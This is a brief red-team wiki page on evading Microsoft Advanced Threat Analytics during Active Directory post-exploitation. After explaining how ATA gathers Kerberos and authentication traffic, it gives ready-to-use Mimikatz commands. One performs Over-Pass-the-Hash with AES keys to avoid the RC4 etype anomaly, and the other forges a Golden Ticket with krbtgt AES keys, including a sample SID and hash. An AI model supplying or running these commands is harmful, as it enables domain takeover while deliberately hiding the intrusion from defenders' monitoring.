---
title: ATA Evasion
category: Post Exploitation
order: 8
---

Advanced Threat Analytics (ATA) is an on-premises platform that helps protect your enterprise from multiple types of advanced targeted cyber attacks and insider threats.

# How ATA works

ATA leverages a proprietary network parsing engine to capture and parse network traffic of multiple protocols (such as Kerberos, DNS, RPC, NTLM, and others) for authentication, authorization, and information gathering. This information is collected by ATA via:

* Port mirroring from Domain Controllers and DNS servers to the ATA Gateway and/or
* Deploying an ATA Lightweight Gateway (LGW) directly on Domain Controllers

ATA takes information from multiple data-sources, such as logs and events in your network, to learn the behavior of users and other entities in the organization, and builds a behavioral profile about them. ATA can receive events and logs from:

* SIEM Integration
* Windows Event Forwarding (WEF)
* Directly from the Windows Event Collector (for the Lightweight Gateway)
* For more information on ATA architecture, see ATA Architecture.

# Evading ATA

It is posible to evade or make less noise while our red teams engagements.

## Over-Pass-The-Hash

There is a different in encryption type for timestamp between a normal `krb-as-req` and one using the Over-Pass-the-hash `krb-as-req`:

* Over-Pass-the-hash krb-as-req etype flag: `eTYPE-ARCFOUR-HMAC-MD5 (23)`
* Normal krb-as-req etype flag: `eTYPE-AES256-CTS-HMAC-SHA1-96 (18)`

To reduce the cahnces of detection use `aes256`, `aes128` and `NTLM(RC4)` together.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /usr:Administrator /domain:corp.local /aes256:<aes256> /aes128:<aes128> /ntlm:<ntlmhash> /run:powershell.exe"'
```

## Golden Ticket

To prevent beeing detected of ATA use the `aes256` keys.

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /aes256:<aes256keysofkrbtgt> /ptt"'
```